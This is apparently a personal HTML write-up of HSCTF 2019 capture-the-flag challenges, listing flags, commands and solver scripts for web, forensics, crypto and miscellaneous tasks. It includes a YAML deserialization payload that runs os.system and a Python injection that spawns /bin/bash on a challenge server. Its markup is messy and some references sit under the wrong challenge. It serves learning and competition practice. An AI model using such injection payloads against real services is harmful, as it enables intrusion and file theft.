
<h1> Web </h1>

Flag is: hsctf{that_was_pretty_easy_right}
<br> View source code with Ctrl + U then you got the first part: 
<pre> The first part of the flag is: hsctf{that_was_ </pre>
Open <code>script.js view-source:https://inspect-me.web.chal.hsctf.com/style.css </code> you got second part
  <pre><code>/* The second part of the flag is: pretty_easy_ */</pre></code>
  Open <i><link rel="stylesheet" href="style.css"></i> you got last part
  <pre><code>
// The last part of the flag is: right}</pre></code>

<h2> JSON info </h2>
<b>>socat - tcp:misc.hsctf.com:9999</b>
<pre>Welcome to JSON info!
Please enter your JSON:</pre>
<b>!!python/object/apply:os.system ["cat flag.txt"]</b>
</pre>hsctf{JS0N_or_Y4ML}
</pre>

<h2> keith Bot </h2>
<a href="https://www.nullpxl.com/blog/hsctf6#jsoninfo">

Reference: https://www.youtube.com/watch?v=VX9043lT0hQ&feature=youtu.be

<h1> Binary Exploitation </h1>
<h2> Intro to netcat </h2>
open terminal and type: nc misc.hsctf.com 1111
flag:

<h2> A byte</h2>
<pre><code>
import codecs

m='69726275677a7631765e7831745e6a6f31765e65355e7640325e39693363403133387c'

ans=''
for i in range(len(m)//2):
    mm=int(m[i*2:i*2+2],16)^1
    ans+= hex(mm)[2:]
print(codecs.decode(ans,'hex'))
</pre></code>
reference: https://tcode2k16.github.io/blog/posts/2019-06-08-hsctf-writeup-rev/#a-byte


<h2> Forget your password </h2>
<b> from <a href="https://github.com/kuruwa2/ctf-writeups/blob/master/HSCTF%206/Forgot%20Your%20Password/generator.py">kuruwa2</a></b>
<pre><code>
#!/usr/bin/env python2

ch = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ '
s = [1975711866010926419, 15319349121703965325]
# TOP SECRET: DO NOT LEAK
def o(x,k):
	return x<<k
def m(a):
	return a&0xffffffffffffffff
def next():
	b = m(s[0]+s[1])
	h()
	return m(b)
def p(k, x):
	return x>>(64-k)
def x(b, a):
	return a^b
def oro(a, b):
	return a|b
def h():
	s1 = m(x(s[0],s[1]))
	s[0] = m(x(oro(o(s[0],55),p(55,s[0])),x(s1,(o(s1,14)))))
	s[1] = m(oro(o(s1,36),p(36,s1)))

# Helper methods
def bin2chr(data):
    result = ''
    while data:
        char = data & 0xff
        result += chr(char)
        data >>= 8
    return result

def isp(d):
	if all(c in ch for c in d):
		return d
	else:
		return d.encode('hex')

# throw away first value for additional randomness
# next()
# next()

COMBO_NUM_1 = isp(bin2chr(next())) + isp(bin2chr(next()))
COMBO_NUM_2 = isp(bin2chr(next())) + isp(bin2chr(next()))
COMBO_NUM_3 = isp(bin2chr(next())) + isp(bin2chr(next()))

print "Thanks! Your numbers are: "
print COMBO_NUM_1
print COMBO_NUM_2
print COMBO_NUM_3
</pre></code>

<h2> Bitecode</h2>
reference: https://eine.tistory.com/entry/HSCTF-2019-Bitecode-Write-up

<h2> Multiplication service </h2>
<pre> <code>p = 2^448 - 2^224 - 1
F=GF(p)
g=F(2)
# use that k * (0, 2) = (0, 2^k), define this to be h
h=F(260571191137716815341287411517193580203843541276741273922047807416174982227377817356425394246343714490986635819120516038840847423836513L)
G=[]
H=[]
X=[]
c=[]
N=[2, 641, 18287, 196687, 1466449, 2916841, 6700417, 1469495262398780123809, 167773885276849215533569, 596242599987116128415063, 37414057161322375957408148834323969]

for i in range(0,len(N)):
    G.append( g^((p-1)/N[i]) )
    H.append( h^((p-1)/N[i] ) )
    X.append(sage.groups.generic.bsgs( G[i] ,H[i],[0, 2**40] ))
    c.append( (X[i],N[i]) )

c.reverse()

for i in range(len(c)):
    if len(c) < 2:
        break
    t1=c.pop()
    t2=c.pop()
    r=crt(t1[0],t2[0],t1[1],t2[1])
    m=t1[1]*t2[1]
    c.append((r,m))

key = c[0][0]
assert(pow(2,key,p)==h)
</pre> </code>

<h2> I though Trig was really easy </h2>
<b>From <a href="https://github.com/kuruwa2/ctf-writeups/tree/master/HSCTF%206/I%20Thought%20Trig%20Was%20Really%20Easy">kuruwa2</a></b>
<pre><code>
import math

def nice_math(x, y):
    return round(x + y*math.cos(math.pi * x))

lots_of_nums = lambda n,a:(lambda r:[*r,n-sum(r)])(range(n//a-a//2,n//a+a//2+a%2))

def get_number(char):
    return ord(char) - 96

inp = input("Enter the text: ")

out = []
for i in range(0, len(inp)):
    for j in lots_of_nums(nice_math(get_number(inp[i]), len(inp) - i), i + 1):
        out.append(nice_math(j, i + 1))

ans = [-25, 1, 10, 7, 4, 7, 2, 9, 3, 8, 1, 10,
            3, -1, -8, 3, -6, 5, -4, 7, -5, 8, -3,
            10, -1, 12, 10, 7, -6, 9, -4, 11, -2,
            13, -2, -11, 6, -9, 8, -7, 10, -5, 12,
            1, -12, 7, -10, 9, -8, 11, -6, 13, -4,
            11, 6, -13, 8, -11, 10, -9, 12, -7, 14,
            -5, 22, -16, 7, -14, 9, -12, 11, -10, 13,
            -8, 15, -6, -2, 2, -21, 4, -19, 6, -17, 8,
            -15, 10, -13, 12, -11, 5]
if (out == ans):
    print("That is correct! Flag: hsctf{" + inp + "}")
else:
    print("Nope sorry, try again!")
</pre></code>

<h2>Tux Talk Show 2019</h2>
reference: https://github.com/kuruwa2/ctf-writeups/tree/master/HSCTF%206/Tux%20Talk%20Show%202019

<h2>VirtualJava</h2>
reference: https://github.com/kuruwa2/ctf-writeups/tree/master/HSCTF%206/VirtualJava

<h2 DaHeck </h2>
reference: https://github.com/kuruwa2/ctf-writeups/tree/master/HSCTF%206/DaHeck

<h2>CaesarsRevenge</h2>
reference: https://github.com/mishrasunny174/CTF/blob/master/hsctf2019/binary%20exploitation/CaesarsRevenge/exploit.py



<h1> Forensics </h1>
<h2> Chicken Crossing </h2>
<b>root@kali:~/Downloads# strings hsctf-chicken_crossing.jpg | grep hsctf</b>
<pre>hsctf{2_get_2_the_other_side}</pre>
Flag is: hsctf{2_get_2_the_other_side}

<h2> Slap </h2>
<b>root@kali:~/Downloads# exiftool slap.jpg | grep hsctf</b>
<pre>Location Shown Country Name     : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut la bore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursu hsctf{twoslapsnonetforce} s risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facilisis volutpat. Magna eget est lorem ipsum dolor sit amet consectetur. Euismod in pellentesque massa placerat. Condimentum vitae sapien pellentesque habitant morbi. Cras sed felis eget velit aliquet sagittis id consectetur. Urna condimentum mattis pellentesque id nibh tortor. Odio aenean sed adipiscing diam donec adipiscing tristique risus nec. Faucibus nisl tincidunt eget nullam non nisi est sit amet. Enim nunc faucibus a pellentesque. Augue eget arcu dictum varius duis at consectetur. Morbi quis commodo odio aenean. Curabitur vitae nunc sed velit dignissim sodales ut. Id venenatis a condimentum vitae sapien pellentesque habitant. Erat nam at lectus urna duis.
Location Shown Sublocation      : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursus risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facilisis volutpat. Magna eget est lorem ipsum dolor sit amet consectetur. Euismod in pellentesque massa placerat. Condimentum <b>hsctf{twoslapsnonetforce}</b> vitae sapien pellentesque habitant morbi. Cras sed felis eget velit aliquet sagittis id consectetur. Urna condimentum mattis pellentesque id nibh tortor. Odio aenean sed adipiscing diam donec adipiscing tristique risus nec. Faucibus nisl tincidunt eget nullam non nisi est sit amet. Enim nunc faucibus a pellentesque. Augue eget arcu dictum varius duis at consectetur. Morbi quis commodo odio aenean. Curabitur vitae nunc sed velit dignissim sodales ut. Id venenatis a condimentum vitae sapien pellentesque habitant. Erat nam at lectus urna duis.</pre>
Flag is: hsctf{twoslapsnonetforce}

<h2> Cool Image </h2>
Flag is: hsctf{sorry_about_the_extra_bytes}
<br><b>root@kali:~/Downloads# file cool.pdf </b>
<pre>cool.pdf: PNG image data, 1326 x 89, 8-bit/color RGBA, non-interlaced</pre>
<b>root@kali:~/Downloads# cp cool.pdf coolpdf.png</b>
<br>open the image you can see the flag

<h2> Logo Sucks Bag </he>
use an <a href="https://stylesuxx.github.io/steganography/">online LSB steganography tool</a> to uncover the message
<pre><code>
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis non velit rutrum, porttitor est a, porttitor nisi. Aliquam placerat nibh ut diam faucibus, ut auctor felis sodales. Suspendisse egestas tempus libero, efficitur finibus orci congue sit amet. Sed accumsan mi sit amet porttitor pellentesque. Morbi et porta lacus. Nulla ligula justo, pulvinar imperdiet porta quis, accumsan et massa. In viverra varius eleifend. Ut congue feugiat leo a ultrices.

Ut risus ipsum, dictum id euismod nec, mattis eu dolor. In aliquam viverra congue. Mauris lacinia lectus quis erat porttitor, vitae iaculis mauris ultrices. Donec quis imperdiet mi, et fermentum purus. Mauris rhoncus sit amet ex quis gravida. In tempor, libero vel finibus tristique, velit est vestibulum est, non semper leo mauris vel enim. Nulla non orci pharetra, bibendum quam a, pharetra felis. Morbi tincidunt, mauris nec aliquam maximus, eros justo rutrum odio, in dapibus sem arcu blandit nunc. Mauris dapibus sem lorem, quis lacinia nunc consectetur pulvinar. Donec sapien erat, pulvinar non fermentum tempor, auctor pellentesque tortor.

Suspendisse id vehicula enim. Cras ut enim sollicitudin, aliquam mauris eget, vehicula arcu. Morbi convallis sed nulla et pellentesque. Cras risus justo, fermentum eget ex ac, dictum dignissim magna. Nullam nec velit vel nulla varius gravida. Aliquam ac lorem tempor, venenatis nibh sed, ultricies urna. In fringilla hendrerit purus, tristique aliquam ipsum molestie vitae. Sed efficitur auctor lacus ac luctus.

Donec id viverra augue. Vivamus nullhsctf{th4_l3est_s3gnific3nt_bbbbbbbbbbbbb}a neque, iaculis quis urna eget, gravida commodo quam. Vestibulum porttitor justo in suscipit rutrum. Sed id tristique ipsum. Nulla vel porta nisl. Quisque leo quam, placerat id neque eu, ullamcorper facilisis lacus. Maecenas magna eros, sollicitudin id est a, fermentum elementum leo. Vestibulum porttitor urna eget bibendum interdum. Mauris eget consequat est. Aenean hendrerit eleifend finibus. Sed eu luctus nulla, non tristique nunc. Cras aliquet vehicula tincidunt. Maecenas nec semper ipsum.

Proin pulvinar lacus id malesuada bibendum. Mauris ac sapien eros. Sed non neque id ante porta finibus eget eget enim. Pellentesque placerat, neque sit amet dictum eleifend, tortor dolor porttitor ex, in vestibulum lacus tortor id purus. Phasellus varius nulla sed magna finibus aliquet. Proin eros metus, sodales vel enim eu, imperdiet pulvinar erat. Nunc quis iaculis dui. In cursus a urna in dapibus. Sed eu elementum quam. Vivamus ornare convallis leo sed mollis. Aenean sit amet nulla vel leo cursus dictum ac nec sem. Morbi nec ultrices felis.
</pre></code>
reference:<a href="https://www.youtube.com/watch?v=Za6czm2w5S8">video</a> <a href="https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load%28input%29-Deprecation">article</a>


<h2> Cool image 2</h2>
<b>$ foremost cool.png</b>
<br><b>$ eog output/png/*.png</b>

<h2> Fish </h2>
<b> steghide extract -sf fish.jpg</b>
<pre>Enter passphrase: bobross63
the file "flag.txt" does already exist. overwrite ? (y/n) y
wrote extracted data to "flag.txt".</pre>
<b> cat flag.txt</b>
<pre>hsctf{fishy_fishy_fishy_fishy_fishy_fishy_fishy123123123123}</pre>



<h1> Miscellaneous </h1>
<h2> Admin Pass</h2>
Check git log and view the content of commit: <code>https://gitlab.com/WeastieWeastie/admin-password/commit/ced3b4c6774184cddaa641a6091210a6242c889e</code>
<br>Flag is: <hsctf{i_love_richard_stallman_hes_so_cute_8a65926fcdcdac0b}

<h2> Discord </h2>
access follow the link in goal: https://discord.gg/KRqsec6 with your acc details
croll on #announment the you can see the flag of this challenges
hsctf{hi_welcome_to_discord}

<h2> Hidden Flag </h2>
<b>xortool chall.png -l 9 -b</b>
<br> see file results to catch the flag: hsctf{n0t_1nv1s1bl3_an5m0r3?_39547632}

<h2> A simple conversation</h2>
<b>__import__("os").system("/bin/bash")</b>
<pre><code>
ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
talk.py
tmp
usr
var
cat flag.txt
hsctf{plz_u5e_pyth0n_3}
exit
Wow!
Sometimes I wish I was 0
Well, it was nice meeting you, 0-year-old.
Goodbye!
</pre></code>

<h1> Crypt</h1>
<h2> Really Secure Algorithm</h2> 
factorize the public key with <a href="http://factordb.com/">factordb</a>
<pre><code>
import gmpy
>>> import libnum
>>> n = 561985565696052620466091856149686893774419565625295691069663316673425409620917583731032457879432617979438142137
>>> e = 65537
>>> c = 328055279212128616898203809983039708787490384650725890748576927208883055381430000756624369636820903704775835777
>>> p = 29
>>> q = 19378812610208711050554891591368513578428260883630885898953907471497427917962675301070084754463193723428901453
>>> assert n == p * q
>>> phi = (p-1)*(q-1)
>>> d = int(gmpy.invert(e,phi))
>>> libnum.n2s(pow(c,d,n))
'hsctf{y3s_rsa_1s_s0lved_10823704961253}
</pre></code>

<h2>Reverse Search Algorithm </h2>
Refernce : https://medium.com/@sbasu7241/hsctf-6-ctf-writeups-a807f0b25ae4

<h2>Massive RSA</h2>
<pre><code>d=modinv(e,n-1)
import codecs
print(codecs.decode(hex(pow(c,d,n))[2:],'hex'))
<pre><code>
n = 950687172821200540428729809153981241192606941085199889710006512529799315561656564788637203101376144614649190146776378362001933636271697777317137481911233025291081331157135314582760768668046936978951230131371278628451555794052066356238840168982528971519323334381994143826200392654688774136120844941887558297071490087973944885778003973836311019785751636542119444349041852180595146239058424861988708991060298944680661305392492285898022705075814390941667822309754536610263449507491311215196067928669134842614154655850281748314529232542980764185554607592605321212081871630106290126123668106453941684604069442637972979374182617204123679546880646955063471680804611387541602675808433185504968764805413712115090234016146947180827040328391684056285942239977920347896230959546196177226139807640271414022569186565510341302134143539867133746492544472279859740722443892721076576952182274117616122050429733446090321598356954337536610713395670667775788540830077914016236382546944507664840405622352934380411525395863579062612404875578114927946272686172750421522119335879522375883064090902859635110578120928185659759792150776022992518497479844711483878613494426215867980856381040745252296584054718251345106582780587533445417441424957999212662923937862802426711722066998062574441680275377501049078991123518677027512513302350533057609106549686502083785061647562269181863107725160293272971931807381453849850066056697913028167183570392948696346480930400320904644898839942228059188904225142187444604612121676565893284697317106343998167640380023972222033520190994951064491572372368101650142992876761420785551386138148283615194775971673577063363049929945959258097086463812469068598955485574579363616634109593903116561526921965491646400040600138481505369027344295330767163087489333402201631708610718911106905154471963379233672543874307197342217544783263700843246351822145605839955798639016346308363889766574606793652730311687899415585873892778899179927359964882217066947566799298173326850382334054179474389651499891117938361854701587568363867264590395711833275763832842002504433841816245069655064326325306033334336469743800464944131049874472540605264250854258280373869113420817955012823462838351481855289027030577957168468047751024562853260494808998446682723835213272609799649864902376137320638444968430858790173696935815430513690803796736064125183005539073920032869713201073105497655763097638587404309062750746064609677994654409535743453776560694719663801069746654445359756195253816544699551
e = 65537
c = 358031506752691557002311547479988375196982422041486602674622689505841503255891193495423484852537391230787811575487947331018616578066891850752360030033666964406349205662189685086812466246139857474435922486026421639388596443953295273675167564381889788905773472245885677132773617051291379731995063989611049809121305468803148551770792609803351375571069366930457307762595216806633327492195442616272627113423143562166655122764898972565860928147259322712805600875994388377208017608434714747741249858321487547543201109467214209112271771033615033493406609653861223917338109193262445432032609161395100024272041503554476490575517100959892951805088735483927048625195799936311280172779052715645263075391841840633949032397082918665057115947698884582406130793211266028238396814146117158924884049679536261009188784571232730683037831940224049822081316216826346444136538278601803972530054219050666898301540575647763640218206611889707353810593843233814867745903144987805142815936160730054575462147126944741419094810558325854901931279755547624294325463528887326262902481099025253153222985717157272371423956465138892784879439141174797253720403065191378958340033965895823856879711180993895832306970105743588207727415495184380531676665121800713201192348940665501790550763379781627493441276077597720109700408848080221149485596419299548121287851605588246207568970548444975309457244824469026820421430723018384050095117420646392648577894835705672984626936461419833136418809219064810002991383584690376016818146065548853387107821627387061145659169570667682815001659475702299150425968489723185023734605402721950322618778361500790860436305553373620345189103147000675410970964950319723908599010461359668359916257252524290941929329344189971893558606572573665758188839754783710992996790764297302297263058216442742649741478512564068171266181773137060969745593802381540073397960444915230200708170859754559500051431883110028690791716906470624666328560717322458030544811229295722551849062570074938188113143167107247887066194761639893865268761243061406701905009155852073538976526544132556878584303616835564050808296190660548444328286965504238451837563164333849009829715536534194161169283679744857703254399005457897171205489516009277290637116063165415762387507832317759826809621649619867791323227812339615334304473447955432417706078131565118376536807024099950882628684498106652639816295352225305807407640318163257501701063937626962730520365319344478183221104445194534512033852645130826246778909064441514943
</pre></code>



